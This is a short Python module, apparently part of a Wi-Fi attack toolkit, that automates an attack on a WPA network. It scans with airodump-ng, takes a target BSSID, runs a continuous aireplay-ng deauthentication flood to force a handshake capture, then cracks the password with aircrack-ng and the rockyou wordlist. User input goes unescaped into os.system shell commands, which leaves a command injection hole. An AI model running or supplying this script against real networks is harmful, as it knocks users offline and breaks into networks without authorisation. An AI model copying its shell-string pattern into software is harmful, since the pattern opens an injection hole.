import os 
import time
import shutil
import banners as br


def StartDeauthAttack():
    APinterface="eth0"
    APtargetBssid = ""
    br.Banner4()

    try:

        APinterface = input("Network card that should be used as deauthenticator \>>")
        if APinterface == '':
            APinterface = "eth0"
        
        while True:
            os.system(f"airodump-ng {APinterface}")
            APtargetBssid = input("Enter the targets bssid (Write the targets bssid and essid somewhere! maybe notepad) \>>")
            if APtargetBssid == "":
                print("Please enter a Targets Adress(Mac adress)")
                time.sleep(3)
                continue
            else:
                break

        os.system(f"xterm -bg black -fg white -hold -e 'airodump-ng --bssid {APtargetBssid} -w /opt/wci/main/captures/handshake/wpa_handshake {APinterface}' &" )
        os.system(f"xterm -bg black -fg white -hold -e 'aireplay-ng -0 0 -a {APtargetBssid} {APinterface}' &" )
        

        print("Starting Deautattack...")
        print("Deauthenticating Target Successfully")
        time.sleep(1)
        os.system("clear")
        while True:     
            os.system("clear")
            br.Banner4()
            try:
                print("Press Ctrl + C to stop the attack and start cracking the password with aircrack-ng.")
            except KeyboardInterrupt:
                break
            time.sleep(1)
    except KeyboardInterrupt:
        os.system(f"xterm -bg black -fg white -hold -e 'aircrack-ng -w /home/ducksteam/Documents/Lists/rockyou/rockyou.txt -b {APtargetBssid} /opt/wci/main/captures/handshake/wpa_handshake-01.cap' &" )
